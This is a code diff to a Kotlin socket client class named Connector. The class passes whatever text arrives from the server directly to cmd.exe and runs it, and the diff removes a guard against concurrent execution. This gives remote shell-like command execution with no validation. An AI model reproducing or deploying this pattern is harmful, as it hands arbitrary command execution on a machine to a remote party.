@@ -23,10 +23,10 @@ class Connector(var token: String, var username: String) {
     lateinit var receiveChannel : ByteReadChannel
     lateinit var sendChannel : ByteWriteChannel
 
-    fun connectToWebsocket(): Unit {
+    fun connectToWebsocket() {
 
         val logger = LoggerFactory.getLogger(this::class.java)
-        logger.debug("Debug : ", "Connecting to WebSocket...")
+        logger.info("Connecting to WebSocket...")
 
         runBlocking {
             selectorManager = SelectorManager(Dispatchers.IO)
@@ -96,9 +96,8 @@ class Connector(var token: String, var username: String) {
                         incomingText = ""
                     }
 
-                    if (incomingText != "ACK" && !isWorking && incomingText != "") {
+                    if (incomingText != "ACK" && incomingText != "") {
                         try {
-                            isWorking = true
                             val p = ProcessBuilder(
                                 "cmd.exe", "/c", incomingText
                             )
@@ -109,7 +108,6 @@ class Connector(var token: String, var username: String) {
                             while (true) {
                                 line = r.readLine()
                                 if (line == null) {
-                                    isWorking = false
                                     break
                                 }
                                 println(line)
